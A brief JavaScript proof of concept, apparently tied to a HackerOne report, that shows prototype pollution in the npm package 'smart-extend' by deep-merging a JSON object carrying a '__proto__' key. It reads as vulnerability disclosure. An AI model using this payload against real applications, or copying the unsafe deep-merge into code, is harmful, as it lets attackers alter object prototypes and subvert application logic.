//https://hackerone.com/reports/438274
var extend = require('smart-extend');   // this is a minified version
var extend = require('smart-extend/dist/smart-extend.debug');
extend.deep({},JSON.parse('{"__proto__":{"polluted":"yes"}}'));
